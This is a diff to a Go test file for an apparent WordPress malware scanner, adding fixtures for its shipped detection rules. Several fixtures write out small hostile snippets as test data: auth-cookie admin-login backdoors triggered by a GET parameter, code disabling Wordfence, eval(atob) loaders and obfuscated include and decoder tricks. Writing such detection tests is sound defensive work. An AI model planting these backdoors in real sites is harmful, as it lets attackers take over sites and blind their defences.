@@ -391,6 +391,8 @@ func TestShippedRulesStayQuietOnLegitimateCode(t *testing.T) {
 		"<?php\nforeach ( $wp_list_table->items as $key => $val ) { if ( $key === 'bdthemes-prime-slider/bdthemes-prime-slider.php' && $this->white_label() ) { unset( $wp_list_table->items[ $key ] ); } }\n")
 	write(t, dir, "plugins/wp-phpmyadmin-extension/library.php",
 		"<?php\nfunction rand_str($length) { $x = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; $y = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; return substr(str_shuffle(str_repeat($x, ceil($length/strlen($x)))), 1, $length); }\nfunction geo_to_eng($input) { return strtr($input, array('ა' => 'a', 'ბ' => 'b')); }\n$d = base64_decode($t);\n")
+	write(t, dir, "plugins/wordpress-seo/gsc-issues.php",
+		"<?php\n$issues = array( 'https://example.invalid/?x=eval(atob(%22ZG9j%22))', 'https://example.invalid/wp-login.php?redirect_to=javascript:eval(atob(1))' );\n")
 	write(t, dir, "plugins/fusion-builder/inc/class-fusion-form-auth-actions.php",
 		"<?php\n$user = wp_signon( array( 'user_login' => $_POST['user'], 'user_password' => $_POST['pass'] ) );\nif ( ! is_wp_error( $user ) ) { wp_set_auth_cookie( $user_id, false, is_ssl() ); }\n")
 	write(t, dir, "plugins/jetpack/extensions/blocks/premium-content/_inc/subscription-service/class-jwt.php",
@@ -552,7 +554,8 @@ func TestShippedRulesCatchCorpusFamilies(t *testing.T) {
 		"plugins/x/kill-wf.php":          {"<?php if (is_dir(WP_PLUGIN_DIR . '/wordfence')) { deactivate_plugins('wordfence/wordfence.php'); rename(WP_PLUGIN_DIR . '/wordfence', WP_PLUGIN_DIR . '/wordfence_'); }", "wordfence-disabling"},
 		"uploads/2024/login.php":         {"<?php if ($_GET['k'] === 'x') { wp_set_auth_cookie(1, true); }", "unauth-admin-login"},
 		"themes/t/inc/helpers.php":       {"<?php add_action('init', function () { if (isset($_GET['tk']) && $_GET['tk'] === 'z') { $u = get_users(['role' => 'administrator', 'number' => 1]); wp_set_auth_cookie($u[0]->ID, true); } });", "theme-auth-cookie-backdoor"},
-		"themes/t/footer.php":            {"<?php wp_footer(); ?><script>eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='))</script>", "js-eval-decoded"},
+		"themes/t/footer.php":            {"<?php wp_footer(); ?><script>eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='))</script>", "js-eval-decoded-inline"},
+		"themes/t/js/loader.js":          {"var q = 1; eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='));", "js-eval-decoded"},
 		"plugins/x/images/ysosheb.png":   {"PNG" + strings.Repeat("K25y1jIkuB4y1ZNeB25bnGM8X", 60), "image-file-is-text"},
 		"plugins/x/loader.php":           {"<?php include_once __DIR__ . \"/suh\" . \"ashu.\" . \"php\"; include_once __DIR__ . \"/toreh\" . \"yb.php\";", "split-path-include"},
 		"plugins/x/decoder.php":          {"<?php class d { static function f($s) { $a = \"URv4WLkh50+AXzpsKnJqf1G/m8drOD3tlYBINbPxaHo97QV=yC6jSFiw2ZMeucgET\"; $b = \"WJvBT+gSx4byalLqYZorpcm7uj1nFUkwtPXM95E6NQDf8iOshz/3CKRH2GV0de=AI\"; $m = array(); for ($i = 0; $i < 64; $i++) { $m[$a[$i]] = $b[$i]; } return base64_decode(strtr($s, $m)); } }", "alphabet-substitution-decoder"},
